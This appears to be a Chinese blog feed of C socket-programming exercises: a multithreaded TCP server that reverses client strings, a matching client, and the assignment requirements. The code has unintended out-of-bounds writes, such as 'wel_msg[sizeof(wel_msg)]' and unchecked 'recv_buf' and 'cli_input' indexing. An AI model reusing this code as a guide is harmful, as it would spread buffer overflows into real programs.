  <span class="keyword">if</span>((listenfd=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"socket() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> opt=SO_REUSEADDR;</div><div class="line">    setsockopt(listenfd,SOL_SOCKET,SO_REUSEADDR,&amp;opt,<span class="keyword">sizeof</span>(opt));</div><div class="line">    bzero(&amp;server,<span class="keyword">sizeof</span>(server));</div><div class="line">    server.sin_family=AF_INET;</div><div class="line">    server.sin_port=htons(PORT);</div><div class="line">    server.sin_addr.s_addr=htonl(INADDR_ANY);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(bind(listenfd,(struct sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"bind() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(listen(listenfd,BACKLOG)==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"listen() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    client_len=<span class="keyword">sizeof</span>(client);</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>((connfd=accept(listenfd,(struct sockaddr *)&amp;client,&amp;client_len))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"accept() failed."</span>);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"runed here!\n"</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        arg=(struct ARG *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct ARG));</div><div class="line">        arg-&gt;connfd=connfd;</div><div class="line"></div><div class="line">        <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)&amp;arg-&gt;client,&amp;client,<span class="keyword">sizeof</span>(client));</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(pthread_create(&amp;tid,<span class="literal">NULL</span>,function,(<span class="keyword">void</span> *)arg))</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"pthread_create() failed."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    close(listenfd);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_cli</span><span class="params">(<span class="keyword">int</span> connfd,struct sockaddr_in client,<span class="keyword">char</span> cli_input[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">ssize_t</span> send_num;</div><div class="line">    <span class="keyword">ssize_t</span> recv_num;</div><div class="line">    <span class="keyword">char</span> send_buf[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> recv_buf[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> client_name[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> wel_msg[]=<span class="string">"[!] Welcome,you can input 'quit' to exit :)  "</span>;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[!] You got a connection from client IP: &lt;%s&gt; PORT: &lt;%d&gt; \n"</span>,inet_ntoa(client.sin_addr),ntohs(client.sin_port));</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((send(connfd,wel_msg,<span class="built_in">strlen</span>(wel_msg),<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"send welcome messages fail."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((recv_num=recv(connfd,client_name,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"recv() failed."</span>);</div><div class="line">        close(connfd);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(recv_num==<span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Client disconnected.\n"</span>);</div><div class="line">        close(connfd);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    client_name[recv_num<span class="number">-1</span>]=<span class="string">'\0'</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Client name: &lt;%s&gt; \n"</span>,client_name);</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>((recv_num=recv(connfd,recv_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"recv() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        recv_buf[recv_num]=<span class="string">'\0'</span>;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[*] Received string: '%s' from client: &lt;%s&gt; \n "</span>,recv_buf,client_name);</div><div class="line"></div><div class="line">        <span class="keyword">int</span> cur_save_len=<span class="built_in">strlen</span>(cli_input);</div><div class="line">        <span class="keyword">while</span>(recv_num--)</div><div class="line">        &#123;</div><div class="line">            cli_input[cur_save_len+recv_num]=recv_buf[recv_num];</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">size_t</span> len=<span class="built_in">strlen</span>(recv_buf);</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;(len/<span class="number">2</span>); ++i)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">char</span> tmp=recv_buf[i];</div><div class="line">            recv_buf[i]=recv_buf[len<span class="number">-1</span>-i];</div><div class="line">            recv_buf[len<span class="number">-1</span>-i]=tmp;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">strcpy</span>(send_buf,recv_buf);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[&gt;] Send reverse string: '%s' to client: &lt;%s&gt; \n"</span>,send_buf,client_name);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((send_num=send(connfd,send_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"send() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(send_buf,<span class="string">"tiuq"</span>))</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"[!] Received a total of string: '%s' from client: &lt;%s&gt; and the client have disconnected! \n"</span>,cli_input,client_name);</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    close(connfd);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">function</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ARG</span> *<span class="title">info</span>;</span></div><div class="line">    info=(struct ARG *)arg;</div><div class="line">    process_cli(info-&gt;connfd,info-&gt;client,info-&gt;cli_input);</div><div class="line">    <span class="built_in">free</span>(arg);</div><div class="line">    pthread_exit(<span class="literal">NULL</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>客户端</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 1234</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXDATASIZE 100</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> sockfd;</div><div class="line">    <span class="keyword">ssize_t</span> send_num;</div><div class="line">    <span class="keyword">ssize_t</span> recv_num;</div><div class="line">    <span class="keyword">char</span> wel_msg[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> cli_name[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> recv_buf[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> send_buf[MAXDATASIZE];</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">he</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></div><div class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Usage:%s &lt;IP Adress&gt;\n"</span>,argv[<span class="number">0</span>]);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>((he=gethostbyname(argv[<span class="number">1</span>]))==<span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"gethostbyname() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>((sockfd=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"socket() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    bzero(&amp;server,<span class="keyword">sizeof</span>(server));</div><div class="line">    server.sin_family=AF_INET;</div><div class="line">    server.sin_port=htons(PORT);</div><div class="line">    server.sin_addr=*((struct in_addr *)he-&gt;h_addr);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(connect(sockfd,(struct sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"connect() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ((recv(sockfd,wel_msg,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"[!] Receive welcome message fail."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    wel_msg[<span class="keyword">sizeof</span>(wel_msg)]=<span class="string">'\0'</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, wel_msg);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Input client name:"</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,cli_name);</div><div class="line">    <span class="keyword">if</span>((send_num=send(sockfd,cli_name,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"send() error."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[*] Input string:"</span>);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,send_buf);</div><div class="line">        send_buf[<span class="built_in">strlen</span>(send_buf)]=<span class="string">'\0'</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((send_num=send(sockfd,send_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"send() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((recv_num=recv(sockfd,recv_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"recv() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[&gt;] Received reverse string:%s\n"</span>,recv_buf);</div><div class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(recv_buf,<span class="string">"tiuq"</span>))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    close(sockfd);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-演示"><a href="#0x02-演示" class="headerlink" title="0x02 演示"></a>0x02 演示</h2><p><strong>服务端</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/1538045214.gif" alt="多线程TSD服务端.gif"></p><p><strong>客服端1</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/1929916423.gif" alt="多线程TSD客户端1.gif"></p><p><strong>客户端2</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/2953103105.gif" alt="多线程TSD客户端2.gif"></p>]]></content>
      
        <categories>
            
            <category> 学习记录 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> socket programming </tag>
            
            <tag> c </tag>
            
            <tag> socket编程练习 </tag>
            
            <tag> c语言 </tag>
            
            <tag> thread specific data </tag>
            
            <tag> 线程专用数据实现 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux平台C语言Socket编程练习之多线程服务器]]></title>
      <url>/2016/11/25/Linux%E5%B9%B3%E5%8F%B0C%E8%AF%AD%E8%A8%80Socket%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0%E4%B9%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      <content type="html"><![CDATA[<h2 id="0x00-要求"><a href="#0x00-要求" class="headerlink" title="0x00 要求"></a>0x00 要求</h2><p>采用多线程并发服务器技术，服务器可以同时接受多个客户的请求。具体要求如下:</p><p><strong>服务端</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">接收并显示与之连接的客户端的名称；</div><div class="line"></div><div class="line">接收客户端发来的字符串，显示出来，并对字符串做反转处理，最后将处理后的字符串发回给客户。</div></pre></td></tr></table></figure><p><strong>客户端</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">根据客户输入的服务器IP地址，向服务器发起建立连接的请求；</div><div class="line"></div><div class="line">接收客户输入的客户端名称，并把该客户端名称发给服务器；</div><div class="line"></div><div class="line">接收客户输入的字符串，将字符串发送给服务器；</div><div class="line"></div><div class="line">接收服务器发回的反转处理后的字符串并显示。继续接受客户输入的字符串，直到用户输入quit时退出。</div></pre></td></tr></table></figure><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><a id="more"></a><p><strong>服务端</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 1234</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BACKLOG 5</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXDATASIZE 100</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_cli</span><span class="params">(<span class="keyword">int</span> connfd,struct sockaddr_in client)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">function</span><span class="params">(<span class="keyword">void</span>* arg)</span></span>;</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ARG</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">    <span class="keyword">int</span> connfd;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client</span>;</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> listenfd;</div><div class="line">    <span class="keyword">int</span> connfd;</div><div class="line">    <span class="keyword">pthread_t</span> tid;</div><div class="line">    <span class="keyword">socklen_t</span> client_len;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ARG</span> *<span class="title">arg</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client</span>;</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span>((listenfd=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"socket() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> opt=SO_REUSEADDR;</div><div class="line">    setsockopt(listenfd,SOL_SOCKET,SO_REUSEADDR,&amp;opt,<span class="keyword">sizeof</span>(opt));</div><div class="line">    bzero(&amp;server,<span class="keyword">sizeof</span>(server));</div><div class="line">    server.sin_family=AF_INET;</div><div class="line">    server.sin_port=htons(PORT);</div><div class="line">    server.sin_addr.s_addr=htonl(INADDR_ANY);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(bind(listenfd,(struct sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"bind() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(listen(listenfd,BACKLOG)==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"listen() failed."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    client_len=<span class="keyword">sizeof</span>(client);</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>((connfd=accept(listenfd,(struct sockaddr *)&amp;client,&amp;client_len))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"accept() failed."</span>);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"runed here!\n"</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        arg=(struct ARG *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct ARG));</div><div class="line">        arg-&gt;connfd=connfd;</div><div class="line"></div><div class="line">        <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)&amp;arg-&gt;client,&amp;client,<span class="keyword">sizeof</span>(client));</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(pthread_create(&amp;tid,<span class="literal">NULL</span>,function,(<span class="keyword">void</span> *)arg))</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"pthread_create() failed."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    close(listenfd);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_cli</span><span class="params">(<span class="keyword">int</span> connfd,struct sockaddr_in client)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">ssize_t</span> send_num;</div><div class="line">    <span class="keyword">ssize_t</span> recv_num;</div><div class="line">    <span class="keyword">char</span> send_buf[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> recv_buf[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> client_name[MAXDATASIZE];</div><div class="line">    <span class="keyword">char</span> wel_msg[]=<span class="string">"[!] Welcome,you can input 'quit' to exit :)  "</span>;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[!] You got a connection from client IP: &lt;%s&gt; PORT: &lt;%d&gt; \n"</span>,inet_ntoa(client.sin_addr),ntohs(client.sin_port));</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((send(connfd,wel_msg,<span class="built_in">strlen</span>(wel_msg),<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"send welcome messages fail."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((recv_num=recv(connfd,client_name,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"recv() failed."</span>);</div><div class="line">        close(connfd);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(recv_num==<span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Client disconnected.\n"</span>);</div><div class="line">        close(connfd);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    client_name[recv_num<span class="number">-1</span>]=<span class="string">'\0'</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Client name: &lt;%s&gt; \n"</span>,client_name);</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>((recv_num=recv(connfd,recv_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"recv() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        recv_buf[recv_num<span class="number">-1</span>]=<span class="string">'\0'</span>;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[*] Received string: '%s' from client: &lt;%s&gt; \n "</span>,recv_buf,client_name);</div><div class="line"></div><div class="line">        <span class="keyword">size_t</span> len=<span class="built_in">strlen</span>(recv_buf);</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;(len/<span class="number">2</span>); ++i)</div><div 